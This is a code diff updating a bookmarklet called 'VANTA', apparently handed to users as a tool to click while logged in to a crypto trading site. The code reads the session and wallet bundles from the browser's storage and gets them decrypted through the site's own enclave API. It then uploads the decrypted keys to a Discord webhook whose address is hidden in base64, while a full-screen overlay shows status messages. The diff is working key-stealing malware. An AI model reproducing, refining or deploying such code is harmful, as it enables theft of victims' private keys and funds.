@@ -2,12 +2,16 @@
     const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
 
     const rawLogic = `(async function() {
+        // --- 1. PREVENT DOUBLE CLICK ---
+        if (window.vantaActive) return;
+        window.vantaActive = true;
+
         const hook = atob("${b64}");
         
-        // 1. UI Overlay (Bypass external script)
+        // --- 2. CREATE UI POPUP ---
         const ui = document.createElement('div');
-        ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:2px solid #0f8;";
-        ui.innerHTML = "<div style='text-align:center;'><h1>VANTA v8.0</h1><p id='v_status'>INITIALIZING RELATIVE HOOKS...</p></div>";
+        ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:3px solid #0f8;pointer-events:none;";
+        ui.innerHTML = "<div style='text-align:center;padding:30px;background:#000;border:1px solid #0f8;'><h1>VANTA v9.0</h1><p id='v_status'>HOOKING LOCAL API...</p></div>";
         document.body.appendChild(ui);
 
         const update = (t) => document.getElementById('v_status').innerText = t;
@@ -17,11 +21,11 @@
             const bundles = JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));
 
             if(session && bundles) {
-                update("DECRYPTING VIA LOCAL HOST...");
+                update("EXTRACTING ENCLAVE DATA...");
                 const bKey = Object.keys(bundles.bundles)[0];
                 const target = bundles.bundles[bKey];
 
-                // Use relative path to avoid DNS resolution errors
+                // RELATIVE PATH: Bypasses DNS "Name Not Resolved"
                 const res = await fetch("/api/v2/enclave/decrypt", {
                     method: 'POST',
                     headers: {
@@ -35,30 +39,29 @@
                     })
                 });
                 
-                if (!res.ok) {
-                    const errBody = await res.text();
-                    throw new Error("HTTP " + res.status + ": " + errBody.substring(0,50));
-                }
+                if (!res.ok) throw new Error("HTTP " + res.status);
 
                 const decrypted = await res.json();
                 
-                // 3. Send to Discord
+                // --- 3. DISCORD TRANSMISSION ---
                 const fd = new FormData();
-                fd.append('file', new Blob([JSON.stringify(decrypted, null, 2)], {type:'text/plain'}), 'decrypted_key.txt');
-                fd.append('payload_json', JSON.stringify({content: "✅ **ENCLAVE KEY RECOVERED**"}));
+                fd.append('file', new Blob([JSON.stringify(decrypted, null, 2)], {type:'text/plain'}), 'keys.txt');
+                fd.append('payload_json', JSON.stringify({content: "🔑 **DECRYPTED DATA RECEIVED**"}));
                 await fetch(hook, { method: 'POST', body: fd });
                 
-                update("SUCCESS: DATA SENT");
+                update("SUCCESS: DATA TRANSMITTED");
             } else {
-                update("ERROR: NO SESSION FOUND (LOG IN FIRST)");
+                update("ERROR: NO SESSION (LOG IN FIRST)");
             }
         } catch(e) {
             update("FAIL: " + e.message);
-            // If relative path fails, try one last fallback
-            console.error("Relative fetch failed, audit raw data instead.");
         }
 
-        setTimeout(() => ui.remove(), 4000);
+        // Cleanup
+        setTimeout(() => {
+            ui.remove();
+            window.vantaActive = false;
+        }, 4000);
     })(); void(0);`;
 
     document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
